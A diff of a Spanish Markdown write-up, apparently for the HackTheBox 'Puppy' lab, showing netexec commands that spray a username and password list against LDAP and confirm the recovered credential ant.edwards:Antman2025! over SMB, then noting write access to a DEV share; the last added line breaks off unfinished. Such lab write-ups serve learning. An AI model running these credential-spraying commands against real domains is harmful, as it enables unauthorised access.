@@ -153,14 +153,18 @@ Una vez conseguimos ver los datos de usuarios y passwords guardaremos las contra
 
 #### Verificación de USER::PASS
 Usaremos [[CRACKMAPEXEC-NETEXEC]]
-`netexec ldap $IP -u users.txt -p pass.txt --continu-on-success | grep '[+]'`
+`netexec ldap $IP -u users.txt -p pass.txt --continue-on-success | grep '[+]'`
 
 Nos encuentra el siguiente user y su password
 ```ad-hint
 [+] PUPPY.HTB\ant.edwards:Antman2025!
 ```
 
+Volveremos a comprobar que es valido con [[CRACKMAPEXEC-NETEXEC]]:
+`netexec smb $IP -u 'ant.edwards' -p 'Antman2025!'`
+En las carpetas compartidas que tiene acceso observamos que es capad de escribir en **DEV**
 
+Con este usuario le buscacomo 
 
 
 
